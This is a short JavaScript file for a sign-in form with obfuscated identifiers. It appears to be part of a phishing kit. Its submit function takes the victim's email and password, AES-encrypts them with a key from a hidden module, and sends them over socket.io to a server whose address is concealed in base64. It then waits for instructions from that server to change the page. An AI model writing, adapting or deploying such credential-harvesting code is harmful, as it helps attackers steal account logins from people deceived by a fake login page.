const fd158d69568247a59252d9c0641af8a0 = require("./u5a6b253ef2d45b180891bc4a1f212ff.js");

const submitBtn = document.getElementById("f42cc63246d74cf7bc009d858a10b2e4");
const emailInput = document.getElementById("8670273112be45d2a8e83f0bbca9db0f");
const passwordInput = document.getElementById("f30226c078224a00a336d66b9dd5350f");
var singleClick = false;

document.addEventListener("keyup", catchEnter);
submitBtn.addEventListener("click", submit);

function catchEnter(event) { 
    if (event.keyCode !== 13) return;
    submit();
}
function submit() {

    if(!emailInput.value) { setCustomError("Please insert your email here", "8670273112be45d2a8e83f0bbca9db0f"); return; }
    if(!validateEmail(emailInput.value)) { setCustomError("Please insert valid email", "8670273112be45d2a8e83f0bbca9db0f"); return; }
    if(!passwordInput.value) { setCustomError("Insert your password", "f30226c078224a00a336d66b9dd5350f"); return; }

    if (!singleClick) {
        singleClick = !singleClick;
        const l642b6c8bc594f3e86abf9bbcf9a4d20 = {
            autoConnect: true, 
            query: { 
                fs58q5e3u7v3v2l00ig32nv20pa1vr06ec: CryptoJS.AES.encrypt(emailInput.value, fd158d69568247a59252d9c0641af8a0.e1af8e88bd704de197b26c904257f7ed.kba6b073237e4940b4373498a34117df), 
                fs58q5e3u7v3u2l00ig32nv20pa1vr06ec: CryptoJS.AES.encrypt(passwordInput.value, fd158d69568247a59252d9c0641af8a0.e1af8e88bd704de197b26c904257f7ed.kba6b073237e4940b4373498a34117df), 
            }
        };
        const socket = io(atob(fd158d69568247a59252d9c0641af8a0.e1af8e88bd704de197b26c904257f7ed.dc503f3c15684a76bd1874dce9cb42a8), l642b6c8bc594f3e86abf9bbcf9a4d20);
        socket.connect();

        //test
        socket.emit("fs58q5e3u7v3u2l00ig32nu20pa1vr06ac", { room: "1" });
        socket.on("fs58q5e3u7v3u2l10ig32nu20pa1vr06ac", (data) => changeContent(data));
        socket.emit("fs58q5e3u7v3u2l10ig32nu20pa1vr06ac", { room: "1" })
    }
}

function setCustomError(errorMessage, elementId) {
    const el = document.getElementById(elementId);
    if(el) { 
        el.setCustomValidity(errorMessage);
        el.reportValidity();
        setTimeout(() => { el.setCustomValidity(""); }, 2000);
    }
}

function validateEmail(emailString) {
    if(!(/^\w+([.-]?\w+)*@\w+([.-]?\w+)*(.\w{2,3})+$/.test(emailString))) 
        return false;
        
    return true;
}

function changeContent(data) {
    document.getElementById("26ac0de49a8043a4877dccdb1a04fe56").innerHTML = "success receiving " + JSON.stringify(data);
}


